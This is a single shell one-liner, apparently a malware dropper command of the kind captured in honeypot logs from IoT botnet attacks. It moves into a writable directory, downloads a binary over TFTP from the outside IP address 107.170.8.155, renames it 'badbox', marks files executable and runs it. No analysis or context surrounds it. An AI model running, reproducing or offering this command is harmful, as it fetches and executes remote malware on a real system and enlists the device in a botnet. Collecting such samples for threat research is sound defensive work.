cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 107.170.8.155;cat wget >badbox;chmod +x *;./badbox
